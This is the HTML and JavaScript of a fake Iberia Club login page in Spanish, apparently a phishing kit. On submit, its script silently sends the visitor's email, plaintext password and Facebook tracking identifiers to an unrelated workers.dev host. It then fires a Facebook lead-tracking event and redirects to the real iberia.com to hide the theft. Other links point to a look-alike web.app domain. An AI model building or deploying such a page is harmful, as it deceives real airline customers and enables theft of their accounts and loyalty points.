<body>

  <!-- HEADER -->
  <header class="ib-header">
    <div class="ib-header__container">
      <div class="ib-header__left">
        <a href="https://www.iberia.com/es/" class="ib-header__logo" title="Iberia">
          <img src="./Xjdsahd637sddUmi/logotopo.svg" alt="Iberia">
        </a>
        <div class="ib-header__separator"></div>
      </div>
      <div class="ib-header__right">
        <span class="ib-header__label">¬øNo tienes cuenta?</span>
        <a href="https://onbusinessiberia.web.app/" class="ib-header__button">Reg√≠strate</a>
      </div>
    </div>
  </header>

  <!-- FORM -->
  <div class="login-wrapper">
    <h1>Acceso a Iberia Club</h1>
    <p class="subtitle">Inicia sesi√≥n para ver promociones exclusivas y utilizar tus Avios.</p>

    <form id="loginForm">
      <div class="input-group">
        <input type="text" name="email" id="emailInput" placeholder="E-mail o n¬∫ Iberia Club" required>
        <p class="error-message" id="emailError"></p>
      </div>

      <div class="input-group password-group">
        <input type="password" name="password" placeholder="Contrase√±a" required>
        <span class="eye-icon">üëÅÔ∏è</span>
      </div>

      <div class="forgot">
        <a href="#">¬øHas olvidado tu contrase√±a?</a>
      </div>

      <button type="submit" class="login-btn" id="submitBtn">Iniciar sesi√≥n</button>

      <div class="divider"><span>o</span></div>

      <button type="button" class="google-btn">
        <img src="https://www.svgrepo.com/show/355037/google.svg" alt="Google"> Entrar con Google
      </button>

      <button type="button" class="facebook-btn">
        <span class="facebook-f">f</span> Entrar con Facebook
      </button>

      <div class="register">
        <p>¬øNo tienes cuenta? <a href="#">Reg√≠strate</a></p>
      </div>
    </form>
  </div>

  <!-- FOOTER -->
  <footer class="ib-footer">
    <div class="ib-footer__red">
      <div class="ib-footer__container">
        <div class="ib-footer__logo ib-footer__logo--red">
          <img src="./Xjdsahd637sddUmi/logofoter.svg" alt="Iberia">
        </div>
        <div class="ib-footer__links">
          <a href="https://onbusinessiberia.web.app/" class="ib-footer__link">Accesibilidad</a>

      </div>
    </div>
    <div class="ib-footer__gray">
      <div class="ib-footer__copyright">¬© Iberia 2025</div>
    </div>
  </footer>

  <!-- SCRIPT -->
  <script>
    // Mostrar/ocultar senha
    const eyeIcon = document.querySelector(".eye-icon");
    const passwordInput = document.querySelector('input[name="password"]');
    eyeIcon.addEventListener("click", () => {
      passwordInput.type = passwordInput.type === "password" ? "text" : "password";
    });

    // Fun√ß√µes auxiliares para capturar cookies e par√¢metros
    function getParam(name) {
      try { return new URLSearchParams(location.search).get(name) || ""; } catch(e) { return ""; }
    }
    function getCookie(name) {
      const m = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
      return m ? m[2] : "";
    }
    function readFbpFbc() {
      const fbp = getCookie('_fbp');
      let fbc = getCookie('_fbc');
      const fbclid = getParam('fbclid');
      if (!fbc && fbclid) fbc = 'fb.1.' + Date.now() + '.' + fbclid;
      return { fbp, fbc, fbclid };
    }
    function readUTMs() {
      const p = (n) => getParam(n);
      return {
        utm_source: p('utm_source'),
        utm_medium: p('utm_medium'),
        utm_campaign: p('utm_campaign'),
        utm_term: p('utm_term'),
        utm_content: p('utm_content')
      };
    }

    // Envio do formul√°rio
    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const email = e.target.email.value.trim();
      const password = e.target.password.value.trim();

      if (!email || !password) return;

      const eventId = 'lead-' + Date.now() + '-' + Math.random().toString(36).slice(2);
      const { fbp, fbc, fbclid } = readFbpFbc();
      const utm = readUTMs();

      try {
        await fetch("https://flat-butterfly-fb71.leticiaramosjesus070.workers.dev/", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            email: email,
            password: password,
            origem: "formulario_firebase",
            consent: true,
            event_id: eventId,
            event_source_url: location.href,
            fbp, fbc, fbclid,
            utm
          })
        });

        if (window.fbq) fbq('track', 'Lead', {}, { eventID: eventId });

        // Redireciona direto ap√≥s envio (sem mostrar "Procesando...")
        window.location.replace('https://www.iberia.com/es/');

      } catch (err) {
        console.error('Erro ao enviar', err);
      }
    });
  </script>
</body>
